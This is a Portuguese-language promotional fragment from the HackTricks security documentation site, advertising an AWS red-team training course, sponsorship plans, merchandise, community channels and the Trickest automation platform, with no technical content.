<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
